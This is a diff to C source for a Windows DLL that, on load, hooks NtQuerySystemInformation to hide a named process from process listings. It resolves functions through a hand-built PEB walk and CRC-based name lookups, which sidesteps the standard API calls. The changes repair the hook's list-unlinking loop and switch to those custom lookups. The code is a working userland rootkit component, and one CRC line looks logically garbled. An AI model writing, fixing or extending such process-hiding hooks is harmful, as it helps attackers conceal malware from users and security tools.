@@ -45,7 +45,6 @@ void to_lower(char *str) {
 }
 
 unsigned int crc32c(const unsigned char* message) {
-    // DYNAMIC_RETURN;
     int i, j;
     unsigned int byte, crc, mask;
     int CRC_CONST = 1 ? message == NULL : 0;
@@ -72,7 +71,6 @@ unsigned int crc32c(const unsigned char* message) {
 }
 
 size_t custom_wcslen(const wchar_t* str) {
-    // DYNAMIC_RETURN;
     if (str == NULL) {
         return 0;
     }
@@ -88,7 +86,7 @@ int custom_wcscmp(const wchar_t* str1, const wchar_t* str2) {
 }
 
 int custom_strcmp(const char* str1, const char* str2) {
-    return crc32c(str1) == crc32c(str2);
+    return crc32c(str1) != crc32c(str2);
 }
 FARPROC _GetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
@@ -99,7 +97,7 @@ FARPROC _GetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
     WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
     DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
     for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
-        if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
+        if (custom_strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
             return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
         }
     }
@@ -115,14 +113,14 @@ HMODULE _GetModuleHandle(LPCWSTR lModuleName) {
     WCHAR substr[MAX_PATH] = { 0 };
     for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
         LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
-        if (wcscmp(pEntry->FullDllName.Buffer, lModuleName) == 0) {
+        if (custom_wcscmp(pEntry->FullDllName.Buffer, lModuleName) == 0) {
             return (HMODULE)pEntry->DllBase;
         }
     }
 }
 FARPROC _GetProcAddressNative(LPCSTR lpProcName){
-    unsigned short sntdll_full_path[] = L"C:\\Windows\\System32\\ntdll.dll";
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    unsigned short sntdll_full_path[] = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
+    HMODULE hNtdll = _GetModuleHandle(sntdll_full_path);
     return _GetProcAddress(hNtdll, lpProcName);
 
 }
@@ -151,15 +149,21 @@ int hookNt(
             return res;
         }
         PSYSTEM_PROCESS_INFORMATION SystemProcInfo =  (PSYSTEM_PROCESS_INFORMATION) SystemInformation;
-        PSYSTEM_PROCESS_INFORMATION prev = NULL;
+        PSYSTEM_PROCESS_INFORMATION prev = SystemProcInfo;
         while (TRUE) {
             if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, whide_me) == 0) {
+                if (SystemProcInfo->NextEntryOffset){
                 prev->NextEntryOffset =prev->NextEntryOffset+SystemProcInfo->NextEntryOffset;
-                break;
+                }
+                else{
+                    prev->NextEntryOffset = 0;
+                }
+            }
+            else{
+                prev = SystemProcInfo;
             }
             if (!SystemProcInfo->NextEntryOffset)
                 break;
-            prev = SystemProcInfo;
             SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
         }
         return res;
@@ -179,7 +183,8 @@ BOOL WINAPI DllMain(
     {
         case DLL_PROCESS_ATTACH:
             HookInfo hNtQ;
-            fpNtQuerySystemInformation pnt = (fpNtQuerySystemInformation)_GetProcAddressNative("NtQuerySystemInformation");
+            fpNtQuerySystemInformation pnt;
+            pnt = (fpNtQuerySystemInformation)_GetProcAddressNative("NtQuerySystemInformation");
             InstallHook(pnt, hookNt, &hNtQ);
             break;
 
@@ -198,7 +203,6 @@ BOOL WINAPI DllMain(
                 break; // do not do cleanup if process termination scenario
             }
             // RemoveHook(pnt, &hNtQ);
-         // Perform any necessary cleanup.
             break;
     }
     return TRUE;  // Successful DLL_PROCESS_ATTACH.
